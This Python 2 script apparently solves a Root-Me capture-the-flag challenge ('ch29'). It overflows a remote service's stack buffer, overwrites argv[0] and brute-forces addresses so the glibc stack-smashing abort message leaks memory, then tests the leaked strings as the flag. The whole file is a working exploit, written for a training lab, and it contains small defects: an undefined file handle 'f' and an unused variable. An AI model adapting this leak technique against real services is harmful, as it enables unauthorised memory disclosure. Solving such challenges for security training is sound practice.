import sys
import struct
import socket
import time
import string

HOST = 'challenge03.root-me.org'
PORT = 56529
ADDRESS_RANGE = xrange(0x804875e, 0x08048790, 1)  # change this

def send(msg):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))

    s.recv(1024)
    s.send('{0}\r\n'.format(msg))
    time.sleep(0.5)
    resp = s.recv(1024)

    s.close()
    return resp


def find_crash_offset():
    sys.stdout.write('[+] Trying to find a stack smashing message... ')
    sys.stdout.flush()

    for offset in xrange(250, 1000):
        resp = send('A' * offset).strip()
        if 'stack smashing detected' in resp:
            print 'Found at {0}.'.format(offset - 1)
            return offset - 1
    print 'Not found'
    exit(1)


def find_argv_offset(msg):
    sys.stdout.write('[+] Trying to find a tampered message... ')
    sys.stdout.flush()

    for offset in xrange(180, 1000):
        resp = send('{0}{1}'.format(msg, 'B' * offset)).strip()
        if '*** stack smashing detected ***' in resp and 'ch29 terminated' not in resp:
            print 'Found at {0}. '.format(offset)
            return offset

    print 'Not found'
    exit(2)


def brute_force_addresses(msg):
    sys.stdout.write('[+] Trying to brute force addresses (may take a while)... ')
    sys.stdout.flush()

    possible = []
    for addr in ADDRESS_RANGE:
        try:
            exploit = '{0}{1}'.format(msg, struct.pack('I', addr))
            resp = send('{0}{1}'.format(msg, struct.pack('I', addr))).strip()
            if '*** stack smashing detected ***: ' not in resp:
                continue
            if ' terminated' not in resp:
                continue

            resp = resp.split('***: ')[1].split(' terminated')[0]
            if all(c in string.printable for c in resp):
                if len(resp) == 0 or ' ' in resp:
                    continue
                if any(resp in s for s in possible):
                    continue
                possible.append(resp)


            f.write('[{0}]: {1}\n'.format(hex(addr), repr(resp)))
        except Exception as e:
            continue

    if len(possible) == 0:
        print 'Not found'
        exit(2)
    else:
        print 'Found {0}.'.format(len(possible))
        return possible


def verify_flag(flag):
        print '[+] Trying to verify the flag... '
        return 'Access granted!' in send('{0}'.format(flag)).strip()


if __name__ == '__main__':
    crash_offset = find_crash_offset()
    argv_offset = find_argv_offset('A' * crash_offset)
    flags = brute_force_addresses('A' * (crash_offset + argv_offset))
    for flag in flags:
        if verify_flag(flag):
            print '[+] Flag: {0}'.format(flag)
            exit(0)
    print '[-] Could not verify one of the options: {0}'.format(', '.join(flags))
